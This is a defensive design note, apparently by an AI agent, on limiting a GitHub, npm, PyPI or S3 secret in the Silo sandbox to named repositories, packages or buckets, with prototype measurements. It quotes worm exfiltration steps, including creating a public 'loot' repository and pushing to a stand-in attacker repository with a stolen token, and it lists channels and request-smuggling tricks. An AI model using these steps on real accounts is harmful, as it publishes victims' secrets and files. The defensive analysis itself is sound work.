# A secret limited to places on its host (gap G2)

Research of 24 November 2026, by an agent, for polarzero. It answers gap G2 of the draft PR #350
(`research/2026-11-24-real-pains/README.md`): worms push what they steal to new public GitHub
repositories with the victim's own `gh` token, and with Silo's placeholder the real token is swapped
in toward github.com, so the call succeeds. Another agent handles where in a request a secret is
swapped (the credential header). This page handles which requests may carry the real value at all.

Entries are named by id: `plan show <id>` prints one. The prototype is in
[`prototypes/resource-scopes/`](prototypes/resource-scopes/); every number below was printed by it on
this machine, and each section says which command printed it.

## Summary

| Question | Recommendation | How sure |
|---|---|---|
| Can a secret be limited to named places on its host, such as repositories? | Yes. Add it to `secret-limits`. The boundary reads the place and the effect of each request from the request's own bytes and from a description of the host's API that ships with Silo as data. The description is built from the host's own machine-readable description: GitHub's OpenAPI file for REST and its GraphQL schema. A change outside the named places is denied. A request that creates a place, changes who can read one, makes code run on the host or deletes something is held. A request the description does not cover is held too. | Sure of the design. The prototype classified all 1,281 REST operations and all 285 GraphQL mutations, and 52 requests sent by real `gh`, `git`, `npm`, `twine` and boto3. |
| Is this a rule or a precaution? | A rule. The method, path, parsed GraphQL operation and Git commands are bytes the boundary read itself. The mapping from operation to effect is the rule's own data (`rule-carries-its-data`). What GitHub answers about its own objects, such as which repository an issue id belongs to, has the same standing as the age a registry reports in `registry-traffic-read`. | Sure |
| Which hosts first? This answers the "to find out" of `secret-limits`. | GitHub (REST, GraphQL, Git over HTTPS, LFS, release uploads), then npm and PyPI publishing, then S3. S3 only works once the boundary signs AWS requests itself. | Sure of GitHub and npm. S3 depends on a mechanism the plan does not have yet. |
| Does that close G2? | Not alone. A worm can bring its own GitHub token and push the loot to its own repository through github.com, which no limit on your secret touches. Add a rule that a host which gets a secret accepts no other credential (a new decision, below). | Sure that the hole exists. Whether the rule should also be on for allowed hosts that get no secret is a choice for polarzero. |
| What is left open | Writes inside a named repository that is public are published at once. A push to a named repository also runs its CI on GitHub's machines, with the repository's secrets and no Silo boundary. Silo can hold pushes that change `.github/workflows`, which it reads from the pushed pack, and must state the rest as the worst case when the limit is set. | Sure of the hole. The workflow check is measured on real pushes. |

## The case

s1ngularity, 26 August 2025 ([Wiz](https://www.wiz.io/blog/s1ngularity-supply-chain-attack),
[Nx post-mortem](https://nx.dev/blog/s1ngularity-postmortem)): a malicious Nx version collected
wallets, `.env` files, SSH keys and GitHub tokens, base64-encoded them, and pushed them to public
repositories it created with the victim's own `gh` token. Over 1,000 valid GitHub tokens and about
20,000 files leaked. In a second phase over 5,500 private repositories were made public. Shai-Hulud
2.0 did the same with 25,000+ repositories, and registered the machine as a self-hosted runner named
"SHA1HULUD" ([Wiz](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)). The evidence
file `evidence/2-secrets.md` of PR #350 lists Keyv and the PyTorch Lightning worm with the same exit.

Played inside Silo today: the computer holds a placeholder for your GitHub token. The worm runs
`gh repo create loot --public` and `git push`. Both go to github.com and api.github.com, the hosts
you allowed for that secret, so the boundary swaps the real token in and GitHub accepts both. The
placeholder kept the token itself out of the loot. Your account was still used to publish
everything else the worm read.

The prototype recorded exactly these requests from the real clients (`gh` 2.89.0, `git` 2.43.0):

```
gh-repo-create     POST api.github.com /graphql      mutation RepositoryCreate … createRepository(input: $input)
gh-api-user-repos  POST api.github.com /user/repos   {"name":"loot2","private":false}
git-push-other-repo POST github.com /victim/loot.git/git-receive-pack
```

Note that `gh repo create` uses GraphQL, not REST. A limit that reads only paths does not see it.
All GraphQL requests go to the one path `/graphql`.

## What "limited to named places" means

A **place** is a thing on a host that a secret can be limited to: a repository on GitHub, a package
on npm or PyPI, a bucket on S3. You name the places when you give the secret, for example
"this GitHub token, for `polarzero/silo` and `polarzero/site`".

Each request the secret would go out with gets one **effect** at the host:

| Effect | Means | GitHub examples |
|---|---|---|
| read | changes nothing | fetch, `GET /repos/o/r/pulls`, a GraphQL query |
| change | changes something inside the place it names | push a branch, open an issue, comment, set a repository secret |
| create | makes a new place | `POST /user/repos`, GraphQL `createRepository`, fork, generate from a template, gist |
| expose | changes who can read or reach something | visibility, rename, transfer, collaborators, deploy keys, account SSH keys, webhooks, a published release or Pages, runner registration tokens, branch protection |
| runs | makes code run on the host's machines | workflow dispatch, re-runs, `repository_dispatch`, codespaces, agent tasks, a push that changes `.github/workflows` |
| destroy | deletes something the host may not bring back | delete a repository, a branch, a release; a push that rewrites a branch |
| unknown | the description does not cover it, or the bytes can be read two ways | an undocumented path, an encoded slash, a method override header, a persisted GraphQL query |

The four columns PR #350 asked for are these effects grouped: within (read, change), creates or
exposes (create, expose, runs), destroys, unknown.

What happens to each, for a secret limited to named places:

| Effect | On a named place | Outside the named places |
|---|---|---|
| read | allowed | denied, or allowed if you chose "reads anywhere" |
| change | allowed, except merges and deploys, which `merges-and-deploys-held` holds | denied |
| create | held: the new place cannot be named in advance | held |
| expose, runs, destroy | held | denied |
| unknown | held | held |

"Denied" is what `secret-limits` already says for a request its limits do not cover: the secret is
not swapped in and the request is refused. "Held" waits for your answer in an ask, within the
hold's limit (`hold-limit`). A rule of yours can turn a hold into an allow, such as "allow releases
on `polarzero/site`".

Why held and not denied for "create": `gh repo create` for a new project is ordinary work, and a
deny would make you give a wider secret by hand. Held, the worm's request waits for an ask that
says "main wants to create a public repository victim/loot with your GitHub token". You say no, or
you are away and the hold ends in a refusal. Either way nothing is published.

## Mechanism

### Where it runs and what it holds

It runs in the boundary, in the process that ends the encrypted connection and swaps secrets
(`ending-the-encrypted-connection`, `secret-placeholder`; which process that is stays open in
`which-process-holds-the-boundary`). For each request carrying a placeholder, before the swap:

1. The boundary parses the request: method, host from the handshake, target, headers, body (gunzipped
   when it is compressed).
2. It classifies the request against the host's description, a data file that ships with Silo the
   way `ecosystem-data` ships what Silo knows of package ecosystems. The result is an effect, the
   places the request touches, and any ids that must be looked up.
3. If a GraphQL mutation names its target only by a node id, or a push needs a tree the pack does not
   hold, the boundary asks the host itself, with the real token, in a request of its own that only
   reads (below). The answer is kept with the decision in the record.
4. It decides allow, hold or deny with the table above, and records the decision with the version of
   the rule and of the description (`rule-decisions-are-recorded`).
5. It forwards the request it parsed. It never forwards raw bytes it did not classify. That one
   choice removes request smuggling: GitHub receives what the boundary read, not a second reading
   of the same bytes.

The limit itself holds, per secret: the named places as names and as the host's own ids, read from
the host when you set the limit (a repository's database id and node id, its default branch, whether
it is public). The names are checked against the ids again when a computer starts. A name that no
longer gives the same id is denied, which covers a renamed repository whose old name someone took.

### GitHub REST

The description is built from GitHub's own OpenAPI file
([github/rest-api-description](https://github.com/github/rest-api-description), version 1.1.4
fetched today) by `build_github_rest.py`. Each of the 1,281 operations gets an effect from an ordered
list of named rules, and records which rule gave it, so that a reviewer can read every one.

```
$ python3 build_github_rest.py api.github.com.json
1281 operations from 1.1.4
  read 671   expose 229   change 172   destroy 164   runs 32   create 10   unknown 1
by what decided it: {'method': 667, 'rule': 491, 'fallback': 123}
writes whose body names another place: 46
```

The paths name the place: `/repos/{owner}/{repo}/…` is that repository. Owner and repository names
are compared in lowercase, because GitHub treats them so. A `.git` suffix is dropped. Five operations
read their body, where the body changes the effect:

| Operation | Read from the body |
|---|---|
| `PATCH /repos/{o}/{r}` | any field other than plain settings (`visibility`, `private`, `name`, `archived`, `default_branch`, `security_and_analysis`) makes it expose |
| `PUT /repos/{o}/{r}/contents/{path}` | a path under `.github/workflows/` or `.github/actions/` makes it runs |
| `PATCH /repos/{o}/{r}/git/refs/{ref}` | `"force": true` makes it destroy |
| `POST /repos/{o}/{r}/releases` and `PATCH …/releases/{id}` | `"draft": true` makes it a change, since a draft is seen only by people who can write |
| `POST /repos/{o}/{r}/forks` | `organization` names a second place |

The sweep (`python3 openapi_sweep.py`) sends one made-up request for each operation and decides it
for a token limited to `victim/app`:

```
creates or exposes   deny  178     destroys  deny 100     within  allow 522
creates or exposes   hold   93     destroys  hold  64     within  deny  316
unknown              hold    2                            within  hold    6
the same repository operations on attacker/inbox: {'deny': 561, 'hold': 3}
requests not read as the operation they were made from: 1
```

The 316 "within, deny" are reads and changes of organizations, other users and the account, which
are not named places. The 3 held on `attacker/inbox` are creates: a fork or a copy of someone
else's repository is a new place of yours. The one request read as another operation is
`POST /orgs/{org}/attestations/bulk-list`, which also matches a second operation with a different
effect. The classifier holds a path that matches two operations with different effects instead of
guessing which one GitHub's router picks.

What the 123 fallbacks are: 102 writes inside a repository with no named rule are filed as change,
such as `POST /repos/{o}/{r}/labels`, and 20 operations of organization categories are filed as
expose. The full list is in `results/rest-build.txt`, one line each. Name rules also misfile a few, in
the direction that holds. `codespaces/publish-for-authenticated-user`, which makes a new repository from a
codespace, is filed as runs, not create. `pulls/rerequest-reviewers` is filed as runs. Both are held
either way. Before this ships, a person reads the 123 lines and the five body rules: a wrong line
here lets a request through, as the notes of `secret-limits` already say of a list of reads.

The exfiltration channels a token can write to, grouped by where the data lands:

| Writes data where the attacker can read it | Effect | With a limit to `polarzero/silo` |
|---|---|---|
| a new public repository, a fork, a copy from a template | create | held |
| a gist, secret or public (a secret gist is readable by anyone with its URL) | create | held |
| an issue, a PR or a comment on the attacker's public repository (the [Invariant Labs](https://invariantlabs.ai/blog/mcp-github-vulnerability) case) | change | denied |
| making a private repository public, renaming, transferring | expose | held |
| a webhook to the attacker's URL, which then receives every push event | expose | held |
| an SSH key or deploy key of the attacker's, which keeps access after the token is taken back | expose | held (deploy key) or denied (account key) |
| a release asset on uploads.github.com, Pages | expose | held |
| a runner registration token (Shai-Hulud 2) | expose | held |
| a workflow dispatch or a push that changes a workflow, which then runs on GitHub's machines with the repository's secrets and no limit on where they send data | runs | held |
| your profile bio, status or a sponsorship (which spends money) | change, expose | denied: the account is not a named place |
| an issue, comment or branch in a named repository that is public | change | **allowed**. See "Bad paths". |

### GitHub GraphQL

`gh` uses GraphQL for most of its work. In the recorded corpus, 9 of the 52 requests went to
`/graphql`, and 5 of those 9 were reads sent as POST: `gh auth status`, the repository lookups of
`gh issue create`, `gh workflow run` and `gh release upload`, and `gh pr list`. A limit that reads
the method alone either refuses those reads, as the notes of `limits-on-a-secret` already say, or
lets every mutation through.

The boundary parses the body with a GraphQL parser (`graphql-core` 3.3.2 in the prototype) and
classifies every operation in the document by the names of its top-level fields:

- A query reads. `repository(owner:, name:)` names its place. `node(id:)` and `nodes(ids:)` name
  node ids to look up. `viewer` with only its own scalar fields reads the account. Anything else,
  such as `search` or `viewer { repositories }`, reads places it does not name, and is allowed only
  under "reads anywhere".
- A mutation gets the effect of its entry in `data/github-graphql.json`, built from GitHub's public
  schema by `build_github_graphql.py`: 285 mutations, change 160, expose 93, destroy 24, create 5,
  runs 3. Forty are filed by name one by one. The other 245 are filed by the verb they start with,
  and every one is listed in the file.
- Aliases do not matter: the field's name is read, not the alias. Fragments and inline fragments on
  `Mutation` are expanded. Every operation in the document counts, whatever `operationName` says,
  because the host picks the operation and the boundary does not rely on picking the same one. A
  JSON array (a batch) counts each item. Variables and their default values are read. A GET with
  `?query=`, a gzip body and `application/graphql` are read the same way.
- Held as unknown: a body with no query text (a persisted query, an `id`), a subscription, a
  document that does not parse, a field that is not in the schema, a fragment that spreads itself,
  and a JSON object that names a key twice, since which copy GitHub keeps is not the boundary's to
  guess.

What the schema shows that a path cannot:

- **No mutation changes visibility.** `UpdateRepositoryInput` has `name`, `description`, `template`,
  `homepageUrl` and the `has…Enabled` flags, and no visibility. Making a repository public goes
  through REST `PATCH /repos/{o}/{r}` only. `updateRepository` with `name` is a rename, so expose.
- **Most mutations name their target by a node id that is not a repository id.** 40 mutations take
  `repositoryId`. 243 name what they act on only by another node id, such as `addComment(subjectId:)`
  or `mergePullRequest(pullRequestId:)`. 2 name no place.
- **Some inputs start work elsewhere.** `createIssue` takes `agentAssignment`, which assigns a coding
  agent on GitHub's side. The classifier files that as runs.

#### Node ids: how the boundary knows which repository a mutation lands in

A repository's node id (`R_kgDO…`) is read once, when the limit is set, so `createIssue` on a named
repository is decided at once. An issue id in `addComment(subjectId: "I_kwDO…")` says nothing the
boundary can trust. GitHub says to "treat these IDs as opaque strings"
([migration guide](https://docs.github.com/en/graphql/guides/migrating-graphql-global-node-ids)).
Decoding the documented examples shows a MessagePack array with a database id inside
(`U_kgDOADP9xw` decodes to `[0, 3407303]`, and the legacy id of the same user decodes to
`04:User3407303`), but a layout GitHub does not promise is no ground for a rule. So the boundary asks
GitHub:

```graphql
query($ids: [ID!]!) { nodes(ids: $ids) { __typename
  ... on RepositoryNode { repository { id nameWithOwner } }
  ... on Repository { id nameWithOwner } } }
```

It sends this itself, with the real token, before it forwards the mutation, and caches the answer
per node id. An issue's repository changes only by `transferIssue`, which is held. A node of no
repository, such as a project, is outside every named repository and denied. The cost is one extra
round trip the first time a node id is seen.

Is GitHub's answer a fact? The plan's `fact` is "one thing Silo saw itself, from outside the
computer". The boundary saw GitHub's answer itself, and no program inside the computer could
change it. It is GitHub's statement about its own objects, as the age of a package is the
registry's statement in `registry-traffic-read`, which the plan already treats as what a rule reads.

### Git over HTTPS

A Git request names its repository in the path: `/{owner}/{repo}(.git)/info/refs`,
`/git-upload-pack` (fetch, a POST that only reads, the case `secret-limits` already names) and
`/git-receive-pack` (push). LFS sends `POST /{o}/{r}.git/info/lfs/objects/batch` with
`"operation": "upload"` or `"download"`.

A push body starts with one command per ref, `old-id new-id ref`, then a pack of objects. The
boundary reads:

- a new id of zeros: the ref is deleted, so destroy;
- an old id of zeros: a new ref, so change;
- otherwise an update. It is a fast-forward only if the old id is an ancestor of the new one through
  the commits in the pack. When that cannot be shown, the push may rewrite history, so destroy
  (held). A rebase followed by `git push --force-with-lease` lands here.
- a push to the default branch of a named repository is a merge, as `merges-and-deploys-held` means
  it, and is held when that set is on;
- the ids of `.github/workflows` and `.github/actions` after the push, compared with before. If either
  differs, the push runs code on GitHub, so runs (held).

The last check needs the trees. A pushed pack holds only the objects GitHub lacks, and by default
`git` sends a "thin" pack whose objects are deltas against objects GitHub already has. Measured on a
real repository (sharkdp/bat, 4,197 commits, three new commits pushed by real `git`, one of them
changing a workflow; `bash thin_experiment.sh`):

```
thin     pack 1513 bytes, 4 objects, 5 deltas on objects outside the pack, root trees readable 0/3, .github ids read 0
no-thin  pack 8798 bytes, 10 objects, 0 deltas on objects outside the pack, root trees readable 2/3, .github ids read 2
```

With a thin pack the boundary can read nothing. Git's protocol has the answer: a receiving server
"can ask the client not to use the feature by advertising the no-thin capability. A client MUST NOT
send a thin pack if the server advertises the no-thin capability"
([protocol-capabilities](https://git-scm.com/docs/protocol-capabilities)). The boundary adds
`no-thin` to the advertisement it passes back from GitHub (`record_proxy.py --no-thin` does it),
real `git` then sent a pack 5.8 times larger and fully readable. The third commit was an empty commit
whose tree GitHub already had, so it was not sent, and it needs no reading. A hostile program can
still send a thin pack against the rule. The boundary sees deltas it cannot resolve, and the push is
held as unknown.

The tree before the push is GitHub's, never in the pack. The boundary reads it with one request of
its own (a GraphQL `object(expression: "<id>:.github")`, or REST `git/trees`). In the corpus that was
10 lookups for 9 pushes. A new branch is compared with the default branch, because `on: push`
workflows run from the pushed branch's own files.

The recorded corpus, decided for a token limited to `victim/app` (`python3 classify_corpus.py OUT`):

```
git-push-branch             POST github.com /victim/app.git/git-receive-pack   change  allow
git-push-workflow           POST github.com /victim/app.git/git-receive-pack   runs    hold   changes .github/workflows
git-push-new-workflow-file  POST github.com /victim/app.git/git-receive-pack   runs    hold
git-push-force              POST github.com /victim/app.git/git-receive-pack   destroy hold   c05f4c0 is not an ancestor in the pack
git-delete-branch           POST github.com /victim/app.git/git-receive-pack   destroy hold
git-push-other-repo         POST github.com /victim/loot.git/git-receive-pack  change  deny
git-push-no-dotgit          POST github.com /victim/app/git-receive-pack       change  allow
```

### What "named repositories" means on each surface

| Surface | Where the repository is named | How the boundary checks it |
|---|---|---|
| Git over HTTPS | the path, `/owner/repo(.git)/…` | lowercase name, compared with the named list |
| REST | the path, `/repos/owner/repo/…`; for a few operations, also the body (`organization`, `owner`, `head`) | the same, plus the body fields of the 46 operations whose body names a place |
| REST by id | `/repositories/{id}`, and `{repository_id}` in organization paths | database ids read when the limit is set. GitHub answers `GET /repositories/42`, but its description does not list it, so it is held |
| GraphQL | `repositoryId`, `repositoryNameWithOwner`, or another node id | node ids of named repositories read when the limit is set; any other node id looked up through `nodes(ids:)` |
| uploads.github.com | the path, `/repos/owner/repo/releases/{id}/assets` | as REST |
| GitHub Enterprise Server | the same paths under `/api/v3`, `/api/graphql` and `/api/uploads` on one host | a per-host setting (`GitHubHosts.enterprise_server` in the prototype). GitHub.com paths on that host are held as unknown |
| codeload.github.com, raw.githubusercontent.com | the path | reads only. Any other method is held |
| gist.github.com | `/{id}.git` | a gist is its own place, never inside a repository |
| api.githubcopilot.com (GitHub's MCP server) | a tool name inside JSON-RPC | not described, so held. Docker Sandboxes inject the GitHub token there |

### npm, PyPI and S3

npm: a publish is `PUT /{name}` whose body carries `_attachments` (recorded from real `npm` 10.9.9).
A scoped name is spelled `/@scope%2fname`, the one encoded slash the npm description allows.
`PUT /-/package/{name}/dist-tags/{tag}` moves `latest` and is a publish too. `POST /-/npm/v1/tokens`
and `PUT /-/user/…` (login) make a token, so expose. `DELETE /{name}/-rev/{rev}` unpublishes. A
publish is held even for a named package. Shai-Hulud republished the victims' own packages with the
worm added, so naming the package does not stop that case. This is the ask `asking-each-use` describes, made
exact: "ask each time this secret publishes", instead of each time it is used.

PyPI: an upload is `POST https://upload.pypi.org/legacy/`, multipart, with `:action=file_upload` and
`name` (recorded from real `twine` 7.0.0). The name is normalized as PyPI does (lowercase, runs of
`-_.` become `-`). PyPI's own project-scoped tokens do the same thing at the source, and are the
better choice where you can make one.

S3: the place is the bucket, in the host (`bucket.s3.region.amazonaws.com`) or the first path
segment (`s3.amazonaws.com/bucket/key`). Reads are GET and HEAD. A write to a bucket outside the
named ones is denied. `?policy`, `?acl`, `?publicAccessBlock`, `?website` and an `x-amz-acl: public…`
header are expose. A `PUT` on a bucket root is CreateBucket. `x-amz-copy-source` names a second
bucket. All of this needs one thing the plan does not have: S3 requests are signed inside the
computer with the secret key (`secret-placeholder` says so of AWS keys), so there is nothing to swap.
The boundary would have to sign them itself, as Fly's tokenizer does with its `sigv4_processor`.
If it does, it can also add `x-amz-expected-bucket-owner: <your account id>`, and S3 then refuses
every request to a bucket of another account: "If the parameter doesn't match the bucket owner's
account ID, the request fails with an Access Denied error"
([AWS](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-owner-condition.html)). That
covers the worm's `PutObject` to an attacker's bucket with your keys, enforced by AWS itself. The
same page lists what it does not cover: CreateBucket, ListBuckets and S3 Control.

### A credential that is not Silo's

Everything above limits your secret. A worm does not need it. Malware can carry its own GitHub
token, or one stolen from an earlier victim, which is what Shai-Hulud 2 did: it published "often
under other victims' accounts" (evidence C3). github.com is allowed, so
`git push https://github.com/attacker/drop.git` with
`Authorization: Basic <x-access-token:ghp_attackers>` reaches GitHub. Today
`ending-the-encrypted-connection` lets every connection to a host that gets no secret pass
"encrypted and unread". When the host does get a secret, the boundary reads the request but only
looks for its placeholder.

The fix is one rule: on a host that gets a secret, a request carrying any credential other than a
placeholder is denied. Credentials are the `Authorization`, `Proxy-Authorization`, `Cookie`,
`X-API-Key` and `PRIVATE-TOKEN` headers, Basic auth decoded into user and password, and token query
parameters (`access_token=`, `token=`). A fixed user name such as `x-access-token` is not a
credential, and a token sent as the user name is one. `foreign_credentials()` in the prototype does
this, and its tests cover each form. The same rule set on any allowed host makes the boundary end the
encrypted connection there too, which is the change `ending-the-encrypted-connection` would need.
GitHub accepts no write without a credential, so on github.com this closes the attacker's own
account as a way out.

## How it fits the plan

- **Rule, not precaution.** Every trigger is a fact. The method, host (from the handshake), path,
  headers and body are what the boundary read. The effect is the rule's own data, built from the
  host's published description (`rule-carries-its-data`, `rules-are-data`). The node and tree
  lookups are the host's answers, read by Silo outside the computer. Nothing comes from inside the
  computer, so `rule-reads-only-facts` holds. An opinion ("is this request exfiltration?") could
  only drive a precaution, which can hold and deny but never allow. A rule that knows "POST
  /repos/attacker/x/issues is a change outside the named places" is exact, and `which-way-first`
  asks for the most reliable way.
- **Kinds of action** (`kinds-of-action`). Allow is granting, so a rule can do it. Hold and deny are
  protective. The node lookup is a read the boundary makes with the real token. It changes nothing
  at the host and gives the computer nothing. It still uses the secret, so the record writes it as
  a request of Silo's own, beside the decision it served.
- **No destination is special** (`security-framing`). The rule is one rule for every host: limit a
  secret to named places, and classify requests by the host's description. GitHub, npm, PyPI and S3
  are data files, like the registry hosts of `ecosystem-data`. A host with no description can still
  get a secret limited to reads and an end time, as today.
- **Uses**: `secret-limits` (extends it and answers its "to find out"), `limits-on-a-secret`,
  `secret-placeholder` (adds nothing to where the swap happens), `ending-the-encrypted-connection`
  (already ends TLS for a host that gets a secret; the new credential rule adds a reason to end it),
  `what-a-fork-is-given` (a fork's secret that only reads can now be limited to the one private
  repository it needs, instead of every repository the token reads), `merges-and-deploys-held`
  (answers its "how Silo recognises a merge", below), `asking-each-use`, `what-an-ask-shows` (an ask
  can now say "create a public repository victim/loot" instead of "POST to api.github.com"),
  `worst-case-and-rule-sets` (states what stays open), `which-rule-wins` and
  `deny-beats-hold-beats-allow` (a deny of another rule still wins over a hold here).
- **Changes nothing taken.** It contradicts no taken decision. It inserts a capability (`no-thin`)
  into a response from GitHub to the computer. `secret-and-prompt-cache` is about requests to model
  providers, so it is not touched, but the record should keep that the response was changed.

How Silo recognises a merge or a deploy on GitHub, which `merges-and-deploys-held` leaves to find
out: REST `PUT /repos/{o}/{r}/pulls/{n}/merge` and `merge-async`, `POST …/merges` and
`…/merge-upstream`; GraphQL `mergePullRequest`, `mergeBranch`, `enablePullRequestAutoMerge` and
`enqueuePullRequest`; a Git push to the default branch read when the limit was set. Deploys: REST
`POST …/deployments` and its statuses, Pages builds and deployments; GraphQL `createDeployment`,
`createDeploymentStatus` and `approveDeployments`. A deploy that is a CLI talking to another host
(Vercel, Railway) needs that host's description.

## Prior art

| Tool | What it restricts | What differs from this design |
|---|---|---|
| GitHub fine-grained tokens ([docs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)) | One owner, selected repositories, per-permission. "Tokens always include read-only access to all public repositories." "Only personal access tokens (classic) have write access for public repositories." No Packages, no Checks API, no projects of a user, no repositories where you are an outside collaborator. | Enforced by GitHub, so the strongest where it applies. It does not apply to `gh`'s own login: `gh auth login` makes an OAuth token whose minimum scopes are `repo`, `read:org` and `gist` (the text is in the `gh` 2.89.0 binary), which can create repositories and gists anywhere you can. Silo's limit works on that token and adds holds and asks. Silo should still tell you to make a fine-grained token when you can. |
| GitHub App installation tokens | Narrowed when made: `POST /app/installations/{id}/access_tokens` takes `repositories`, `repository_ids` and `permissions` (in the OpenAPI file). They end after an hour. | The same strength as fine-grained tokens. Codex cloud uses a GitHub App, by third-party accounts; OpenAI's own page read here does not say. |
| Fly.io tokenizer ([README](https://github.com/superfly/tokenizer)) | `allowed_hosts` or `allowed_host_pattern` per sealed secret; `allowed_dst` and `allowed_fmt` say where in the request the secret goes; a `sigv4_processor` signs AWS requests in the proxy. | Hosts only. No paths, methods or bodies. Its AWS signing is the prior art for the S3 part here. |
| OneCLI ([how it works](https://onecli.sh/docs/how-it-works.md)) | Rules by identity and target (an app, a secret, a network pattern), first match wins; Block (403), Allow with optional approval, rate limit. | First match wins, where Silo's rules have no order. The page read says nothing of bodies or GraphQL. |
| Infisical Agent Vault ([HTTP APIs](https://infisical.com/docs/documentation/platform/agent-vault/http-apis.md)) | Per service: hosts, ports, HTTP methods, path prefixes that match whole segments. Its own GitHub example allows GET and POST on `/repos` and `/search`. | Path prefixes cannot tell `POST /repos/you/app/issues` from `POST /repos/attacker/inbox/issues`, and cannot see a GraphQL mutation. |
| Docker Sandboxes ([credentials](https://docs.docker.com/ai/sandboxes/security/credentials/)) | Injects the GitHub token for api.github.com, github.com, raw.githubusercontent.com, gist.github.com, copilot.github.com and api.githubcopilot.com. | No path or repository restriction described. The worm case goes through. |
| Codex cloud ([internet access](https://learn.chatgpt.com/docs/cloud/internet-access)) | A domain allowlist, and "for extra protection, restrict network requests to GET, HEAD, and OPTIONS". | Method only. It refuses Git fetches and GraphQL reads, both sent as POST, which is the case `secret-limits` was written for. |
| StepSecurity Harden-Runner ([docs](https://docs.stepsecurity.io/github-actions/harden-runner)) | Egress by domain in CI; it watches API calls to recommend the least `GITHUB_TOKEN` permissions. | No limit by repository found in what was read. |
| This research machine's own egress proxy (Claude Code on the web) | Refused `GET api.github.com/repos/cli/cli` with "GitHub access to this repository is not enabled for this session. Use add_repo to request access", and offers a separate `access:"push"` to attach credentials. | Observed, not documented here: a proxy outside the agent that limits GitHub by repository, with push as a separate grant. The same shape as this design. |
| AWS bucket owner condition ([docs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-owner-condition.html)); AWS data perimeters with `aws:ResourceAccount` | S3 refuses a request whose bucket is not owned by the expected account. | Enforced by AWS, if the request carries the header, which needs the boundary to sign. Data perimeter policies need VPC endpoints, which a Silo computer does not use; not read for this research. |
| Invariant Labs' mitigation (evidence B2) | "One repository per session." | The same limit, set by hand for each session. |

## Bad paths

Each with its outcome. The agent is treated as hostile.

1. **Publishing inside a named public repository.** The agent pushes a branch of stolen files to
   `polarzero/silo`, which is public, or opens an issue there. The limit allows it: a false negative
   by design, since the repository is named. When the limit is set, Silo reads from GitHub that the
   repository is public and says: "anything this secret writes to polarzero/silo is public at once".
   Turning on "hold writes that land in a public repository" (`hold_public` in the prototype) holds
   each push, issue and comment there. That costs an ask per push on an open-source repository.
2. **CI runs what the agent pushes.** A push to a named repository with `on: push` workflows runs
   those workflows on GitHub's machines, with the repository's secrets and open egress. Changing the
   workflow files themselves is caught and held. Changing a test or a build script that the
   existing workflow runs is not: a false negative no reading of the push can close, because any
   file can be code. Silo states it as the limit's worst case, naming the workflows that run on push
   and the names of the repository's Actions secrets, both read from GitHub when the limit is set.
   The protections that exist are on GitHub's side: environments with required reviewers, secrets
   kept out of push workflows.
3. **The attacker's own credential.** Covered by the credential rule above. Without that rule this
   design leaves G2 half open.
4. **GraphQL tricks**: aliases, fragments, inline fragments, a second operation picked by
   `operationName`, batches, variables, GET, gzip, `application/graphql`, persisted queries,
   duplicate JSON keys, subscriptions, unknown fields. Each is a test and each gives the outcome
   above. A cost: a GraphQL client that sends persisted queries only, which `gh` does not, would get
   every request held.
5. **Node ids.** Looked up, never decoded. If GitHub's answer to the lookup fails, the mutation is
   held. A node that moves repository after the lookup can only move by `transferIssue`, which is
   held.
6. **Method override.** `X-HTTP-Method-Override`, `X-HTTP-Method`, `X-Method-Override` or a
   `_method` query parameter: held as unknown. Whether GitHub honours any of them was not tested,
   because this machine cannot reach api.github.com with a token. Holding them costs nothing: `gh`
   sends none.
7. **Path spellings.** `%2F`, `%2E`, `%5C`, `%00`, `;`, a backslash, `//`, `.` and `..` segments, a
   trailing slash, characters outside printable ASCII: held as unknown. Upper and lower case are
   folded, `.git` is dropped. The one encoded slash npm needs is allowed on npm's host only.
8. **Redirects and renames.** The boundary does not follow redirects. The program sends the request
   again and the boundary classifies it again. A repository's old name after a rename no longer
   matches, so it is denied. Renaming a named repository is expose, so held. The limit keeps ids, so
   a new repository that takes an old name is not the named one.
9. **Another host for the same API.** api.github.com, uploads.github.com and github.com each get the
   secret only if listed. A GitHub Enterprise Server is its own description setting. A `Host`
   header that differs from the name in the TLS handshake must be denied (domain fronting). The
   prototype takes the host as given and does not test this. The Git push
   to a gist goes to gist.github.com and is a gist place. GitHub's MCP server is held until it has a
   description.
10. **Request smuggling, HTTP/2 tricks.** The boundary forwards the request it parsed, so a second
    reading of the same bytes never reaches GitHub. Its parser must also refuse a request with both
    `Content-Length` and `Transfer-Encoding`. The prototype classifies requests already parsed and
    does not test this.
11. **Description drift.** GitHub adds an operation. Until the description is regenerated, the
    new path is unknown and held. Today, 2 of 1,281 operations are unknown, and an undocumented path
    such as `GET /repositories/42` is held.
12. **A wrong line in the description.** A write filed as read would let it through. 123 operations
    rest on a fallback, listed one per line in `results/rest-build.txt`. This is the risk
    `secret-limits` already names, and the answer is the same: the file is reviewed, and checked
    against the host's own description by a test each time it is rebuilt.
13. **Thin packs.** Silo asks for no-thin. A program that sends a thin pack anyway gets its push
    held. A hostile program can also send a pack with objects that do not hash to their ids. The
    parser hashes every object it resolves, and a commit that does not match is not found.
14. **History rewrites that are fine.** An agent that rebases and pushes with `--force-with-lease`
    gets a hold each time (destroy). That cost is real for agents. A rule "allow rewriting
    branches other than the default branch of polarzero/silo" removes it, and it is a rule you set.
15. **Hold length.** A worm's repository creation at 3 a.m. waits for the hold's limit, then is
    refused. A legitimate release at 3 a.m. is refused the same way. That is
    `hold-limit-length`, which another agent is answering (C1 of PR #350).
16. **Reads as a channel.** Under "reads anywhere", a GET can still carry data in its path to a host
    that logs it. GitHub's traffic page shows the account that owns a repository counts of clones
    and views, referring sites and its most viewed paths, so the channel left is narrow. Under "named reads", reads of other repositories are denied.
17. **Money.** `createSponsorship` spends money from your account. Denied: the account is not a
    named place.

## Prototype: what ran and what it printed

All under `research/2026-11-24-gap-fixes/prototypes/resource-scopes/`. Python 3.13 with
`graphql-core` 3.3.2; the recording needs `gh`, `git`, `npm`, `twine`, boto3 and `cryptography`.

| Piece | Run | What it showed |
|---|---|---|
| `build_github_rest.py`, `build_github_graphql.py` | `python3 build_github_rest.py api.github.com.json`, `python3 build_github_graphql.py schema.docs.graphql` (the two files fetched from GitHub; not committed, 14 MB and 1.6 MB) | the counts above; the tables in `data/` |
| `classify.py` | imported by the rest | the classifier and `decide()` |
